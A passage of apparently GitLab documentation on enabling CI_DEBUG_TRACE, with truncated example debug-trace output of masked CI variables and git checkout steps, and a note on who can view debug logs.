    CI_DEBUG_TRACE: "true"
```

Example output (truncated):

```plaintext
...
export CI_SERVER_TLS_CA_FILE="/builds/gitlab-examples/ci-debug-trace.tmp/CI_SERVER_TLS_CA_FILE"
if [[ -d "/builds/gitlab-examples/ci-debug-trace/.git" ]]; then
  echo $'\''\x1b[32;1mFetching changes...\x1b[0;m'\''
  $'\''cd'\'' "/builds/gitlab-examples/ci-debug-trace"
  $'\''git'\'' "config" "fetch.recurseSubmodules" "false"
  $'\''rm'\'' "-f" ".git/index.lock"
  $'\''git'\'' "clean" "-ffdx"
  $'\''git'\'' "reset" "--hard"
  $'\''git'\'' "remote" "set-url" "origin" "https://gitlab-ci-token:xxxxxxxxxxxxxxxxxxxx@example.com/gitlab-examples/ci-debug-trace.git"
  $'\''git'\'' "fetch" "origin" "--prune" "+refs/heads/*:refs/remotes/origin/*" "+refs/tags/*:refs/tags/lds"
++ CI_BUILDS_DIR=/builds
++ export CI_PROJECT_DIR=/builds/gitlab-examples/ci-debug-trace
++ CI_PROJECT_DIR=/builds/gitlab-examples/ci-debug-trace
++ export CI_CONCURRENT_ID=87
++ CI_CONCURRENT_ID=87
++ export CI_CONCURRENT_PROJECT_ID=0
++ CI_CONCURRENT_PROJECT_ID=0
++ export CI_SERVER=yes
++ CI_SERVER=yes
++ mkdir -p /builds/gitlab-examples/ci-debug-trace.tmp
++ echo -n '-----BEGIN CERTIFICATE-----
-----END CERTIFICATE-----'
++ export CI_SERVER_TLS_CA_FILE=/builds/gitlab-examples/ci-debug-trace.tmp/CI_SERVER_TLS_CA_FILE
++ CI_SERVER_TLS_CA_FILE=/builds/gitlab-examples/ci-debug-trace.tmp/CI_SERVER_TLS_CA_FILE
++ export CI_PIPELINE_ID=52666
++ CI_PIPELINE_ID=52666
++ export CI_PIPELINE_URL=https://gitlab.com/gitlab-examples/ci-debug-trace/pipelines/52666
++ CI_PIPELINE_URL=https://gitlab.com/gitlab-examples/ci-debug-trace/pipelines/52666
++ export CI_JOB_ID=7046507
++ CI_JOB_ID=7046507
++ export CI_JOB_URL=https://gitlab.com/gitlab-examples/ci-debug-trace/-/jobs/379424655
++ CI_JOB_URL=https://gitlab.com/gitlab-examples/ci-debug-trace/-/jobs/379424655
++ export CI_JOB_TOKEN=[MASKED]
++ CI_JOB_TOKEN=[MASKED]
++ export CI_REGISTRY_USER=gitlab-ci-token
++ CI_REGISTRY_USER=gitlab-ci-token
++ export CI_REGISTRY_PASSWORD=[MASKED]
++ CI_REGISTRY_PASSWORD=[MASKED]
++ export CI_REPOSITORY_URL=https://gitlab-ci-token:[MASKED]@gitlab.com/gitlab-examples/ci-debug-trace.git
++ CI_REPOSITORY_URL=https://gitlab-ci-token:[MASKED]@gitlab.com/gitlab-examples/ci-debug-trace.git
++ export CI_JOB_NAME=debug_trace
++ CI_JOB_NAME=debug_trace
++ export CI_JOB_STAGE=test
++ CI_JOB_STAGE=test
++ export CI_NODE_TOTAL=1
++ CI_NODE_TOTAL=1
++ export CI=true
++ CI=true
++ export GITLAB_CI=true
++ GITLAB_CI=true
++ export CI_SERVER_URL=https://gitlab.com:3000
++ CI_SERVER_URL=https://gitlab.com:3000
++ export CI_SERVER_HOST=gitlab.com
++ CI_SERVER_HOST=gitlab.com
++ export CI_SERVER_PORT=3000
++ CI_SERVER_PORT=3000
++ export CI_SERVER_SHELL_SSH_HOST=gitlab.com
++ CI_SERVER_SHELL_SSH_HOST=gitlab.com
++ export CI_SERVER_SHELL_SSH_PORT=22
++ CI_SERVER_SHELL_SSH_PORT=22
++ export CI_SERVER_PROTOCOL=https
++ CI_SERVER_PROTOCOL=https
++ export CI_SERVER_NAME=GitLab
++ CI_SERVER_NAME=GitLab
++ export GITLAB_FEATURES=audit_events,burndown_charts,code_owners,contribution_analytics,description_diffs,elastic_search,group_bulk_edit,group_burndown_charts,group_webhooks,issuable_default_templates,issue_weights,jenkins_integration,ldap_group_sync,member_lock,merge_request_approvers,multiple_issue_assignees,multiple_ldap_servers,multiple_merge_request_assignees,protected_refs_for_users,push_rules,related_issues,repository_mirrors,repository_size_limit,scoped_issue_board,usage_quotas,wip_limits,adjourned_deletion_for_projects_and_groups,admin_audit_log,auditor_user,batch_comments,blocking_merge_requests,board_assignee_lists,board_milestone_lists,ci_cd_projects,cluster_deployments,code_analytics,code_owner_approval_required,commit_committer_check,cross_project_pipelines,custom_file_templates,custom_file_templates_for_namespace,custom_project_templates,custom_prometheus_metrics,cycle_analytics_for_groups,db_load_balancing,default_project_deletion_protection,dependency_proxy,deploy_board,design_management,email_additional_text,extended_audit_events,external_authorization_service_api_management,feature_flags,file_locks,geo,github_integration,group_allowed_email_domains,group_project_templates,group_saml,issues_analytics,jira_dev_panel_integration,ldap_group_sync_filter,merge_pipelines,merge_request_performance_metrics,merge_trains,metrics_reports,multiple_approval_rules,multiple_group_issue_boards,object_storage,operations_dashboard,packages,productivity_analytics,project_aliases,protected_environments,reject_unsigned_commits,required_ci_templates,scoped_labels,service_desk,smartcard_auth,group_timelogs,type_of_work_analytics,unprotection_restrictions,ci_project_subscriptions,container_scanning,dast,dependency_scanning,epics,group_ip_restriction,incident_management,insights,license_management,personal_access_token_expiration_policy,pod_logs,prometheus_alerts,report_approver_rules,sast,security_dashboard,tracing,web_ide_terminal
++ GITLAB_FEATURES=audit_events,burndown_charts,code_owners,contribution_analytics,description_diffs,elastic_search,group_bulk_edit,group_burndown_charts,group_webhooks,issuable_default_templates,issue_weights,jenkins_integration,ldap_group_sync,member_lock,merge_request_approvers,multiple_issue_assignees,multiple_ldap_servers,multiple_merge_request_assignees,protected_refs_for_users,push_rules,related_issues,repository_mirrors,repository_size_limit,scoped_issue_board,usage_quotas,wip_limits,adjourned_deletion_for_projects_and_groups,admin_audit_log,auditor_user,batch_comments,blocking_merge_requests,board_assignee_lists,board_milestone_lists,ci_cd_projects,cluster_deployments,code_analytics,code_owner_approval_required,commit_committer_check,cross_project_pipelines,custom_file_templates,custom_file_templates_for_namespace,custom_project_templates,custom_prometheus_metrics,cycle_analytics_for_groups,db_load_balancing,default_project_deletion_protection,dependency_proxy,deploy_board,design_management,email_additional_text,extended_audit_events,external_authorization_service_api_management,feature_flags,file_locks,geo,github_integration,group_allowed_email_domains,group_project_templates,group_saml,issues_analytics,jira_dev_panel_integration,ldap_group_sync_filter,merge_pipelines,merge_request_performance_metrics,merge_trains,metrics_reports,multiple_approval_rules,multiple_group_issue_boards,object_storage,operations_dashboard,packages,productivity_analytics,project_aliases,protected_environments,reject_unsigned_commits,required_ci_templates,scoped_labels,service_desk,smartcard_auth,group_timelogs,type_of_work_analytics,unprotection_restrictions,ci_project_subscriptions,cluster_health,container_scanning,dast,dependency_scanning,epics,group_ip_restriction,incident_management,insights,license_management,personal_access_token_expiration_policy,pod_logs,prometheus_alerts,report_approver_rules,sast,security_dashboard,tracing,web_ide_terminal
++ export CI_PROJECT_ID=17893
++ CI_PROJECT_ID=17893
++ export CI_PROJECT_NAME=ci-debug-trace
++ CI_PROJECT_NAME=ci-debug-trace
...
```

#### Access to debug logging

Access to debug logging is restricted to [users with at least the Developer role](../../user/permissions.md#cicd). Users with a lower role cannot see the logs when debug logging is enabled with a variable in:

- The [`.gitlab-ci.yml` file](#define-a-cicd-variable-in-the-gitlab-ciyml-file).
- The CI/CD variables set in the GitLab UI.

WARNING:
If you add `CI_DEBUG_TRACE` as a local variable to runners, debug logs generate and are visible
to all users with access to job logs. The permission levels are not checked by the runner,
so you should only use the variable in GitLab itself.
